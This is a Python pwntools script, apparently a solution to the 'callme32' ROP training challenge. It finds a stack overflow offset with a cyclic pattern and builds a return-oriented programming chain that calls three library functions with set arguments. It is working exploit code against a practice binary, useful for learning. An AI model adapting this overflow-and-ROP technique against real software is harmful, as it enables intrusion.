from pwn import *
#context.log_level = "DEBUG"

elf = ELF('./callme32')
#lib = ELF('./libcallme32.so')
p = process('./callme32')

# find offset
g = cyclic_gen()
t = g.get(100)
p.recvuntil(b'>')
p.sendline(t)
p.recvall()
eip = b'\x61\x61\x61\x6c'
eip = hex(unpack(eip, 32))
eip = bytes.fromhex(eip[2:]).decode()
offset = g.find(eip)[0]
log.info(f'offset: {offset}')
p.close()

# start exploit
rop = ROP('./callme32')
rop.raw(b'A' * offset)
rop.call('callme_one',[0xdeadbeef, 0xcafebabe, 0xd00df00d])
rop.call('callme_two',[0xdeadbeef, 0xcafebabe, 0xd00df00d])
rop.call('callme_three',[0xdeadbeef, 0xcafebabe, 0xd00df00d])
payload = rop.chain()
log.info(f'ROP_chain: {rop.dump()}')

p = process('./callme32')
p.recvuntil(b'>')
p.sendline(payload)
p.recvline()
log.success(p.recvline().decode())
log.success(p.recvline().decode())
log.success(p.recvline().decode())
p.close()